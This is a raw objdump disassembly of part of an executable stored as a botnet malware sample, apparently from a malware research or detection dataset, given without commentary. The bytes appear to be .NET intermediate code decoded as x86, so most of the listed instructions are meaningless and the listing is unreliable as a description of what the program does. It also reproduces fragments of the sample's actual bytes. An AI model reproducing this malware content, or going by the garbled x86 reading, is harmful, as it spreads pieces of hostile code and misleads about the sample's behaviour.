
malware_samples/botnet/3c06afd6074e6b5a71138f3037d0b03d6ff4ee589d8aed2c15ae7db38250009e.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	60                   	pusha
  402001:	d0 00                	rolb   $1,(%eax)
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 f4 59 00       	add    $0x59f400,%eax
  402013:	00 34 76             	add    %dh,(%esi,%esi,2)
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	aa                   	stos   %al,%es:(%edi)
  4021d0:	25 00 70 7e 10       	and    $0x107e7000,%eax
  4021d5:	00 00                	add    %al,(%eax)
  4021d7:	04 28                	add    $0x28,%al
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 5e 21 00       	and    $0x215e72,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 56                	jb     0x40224c
  4021f6:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 5e 21 00       	and    $0x215e72,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 68                	jb     0x40228e
  402226:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 68 26 00       	and    $0x266872,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 58             	add    %dh,0x58(%edx)
  4024e4:	21 00                	and    %eax,(%eax)
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
  4025e6:	7a 03                	jp     0x4025eb
